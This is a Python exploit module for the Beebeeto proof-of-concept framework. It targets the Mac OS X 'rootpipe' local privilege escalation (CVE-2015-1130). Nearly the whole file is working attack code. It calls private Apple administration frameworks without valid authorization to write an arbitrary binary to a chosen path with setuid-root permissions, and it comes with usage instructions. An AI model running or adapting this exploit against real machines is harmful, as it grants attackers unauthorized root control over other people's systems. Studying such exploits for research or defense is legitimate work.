#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import os
import objc
import ctypes
import platform

from Cocoa import NSData, NSMutableDictionary, NSFilePosixPermissions
from Foundation import NSAutoreleasePool

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0079',
            'name': 'Mac OS X rootpipe 本地权限提升漏洞 (CVE-2015-1130) Exploit',
            'author': 'Emil Kvarnhammar',
            'create_date': '2015-04-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'local',
            'port': [0],
            'layer4_protocol': [],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Mac OS X',
            'vul_version': ['10.7.5', '10.8.2', '10.9.5', '10.10.2'],
            'type': 'Other',
            'tag': ['Mac OS X 提权漏洞', 'Mac OS X rootpipe Local Privilege Escalation Vulnerability',
                    'CVE-2015-1130',],
            'desc': '''
                    PoC exploit code for rootpipe (CVE-2015-1130)
                    Created by Emil Kvarnhammar, TrueSec
                    Tested on OS X 10.7.5, 10.8.2, 10.9.5 and 10.10.2
                    # Usage: python exploit.py -t bashtest -d bashroot
                    ''',
            'references': [
                    'http://www.exploit-db.com/exploits/36692/',
                    'http://drops.wooyun.org/tips/5566',
            ],
        },
    }

    def _init_user_parser(self):  # 定制命令行参数
        self.user_parser.add_option('-d','--dest_binary',
                                    action='store', dest='dest_binary', type='string', default=None,
                                    help='dest_binary')


    @staticmethod
    def load_lib(append_path):
        return ctypes.cdll.LoadLibrary("/System/Library/PrivateFrameworks/" + append_path);

    @staticmethod
    def use_old_api():
        return re.match("^(10.7|10.8)(.\d)?$", platform.mac_ver()[0])

    @classmethod
    def verify(cls, args):
        source_binary = args['options']['target']
        dest_binary = os.path.realpath(args['options']['dest_binary'])

        if not os.path.exists(source_binary):
            raise Exception("file does not exist!")

        pool = NSAutoreleasePool.alloc().init()

        attr = NSMutableDictionary.alloc().init()
        attr.setValue_forKey_(04777, NSFilePosixPermissions)
        data = NSData.alloc().initWithContentsOfFile_(source_binary)

        print "[*] will write file", dest_binary

        if cls.use_old_api():
            adm_lib = cls.load_lib("/Admin.framework/Admin")
            Authenticator = objc.lookUpClass("Authenticator")
            ToolLiaison = objc.lookUpClass("ToolLiaison")
            SFAuthorization = objc.lookUpClass("SFAuthorization")

            authent = Authenticator.sharedAuthenticator()
            authref = SFAuthorization.authorization()

            # authref with value nil is not accepted on OS X <= 10.8
            authent.authenticateUsingAuthorizationSync_(authref)
            st = ToolLiaison.sharedToolLiaison()
            tool = st.tool()
            tool.createFileWithContents_path_attributes_(data, dest_binary, attr)
        else:
            adm_lib = cls.load_lib("/SystemAdministration.framework/SystemAdministration")
            WriteConfigClient = objc.lookUpClass("WriteConfigClient")
            client = WriteConfigClient.sharedClient()
            client.authenticateUsingAuthorizationSync_(None)
            tool = client.remoteProxy()

            tool.createFileWithContents_path_attributes_(data, dest_binary, attr, 0)

        print "[+] Done!"
        del pool
        args['success'] = True
        args['poc_ret']['dest_binary'] = dest_binary
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())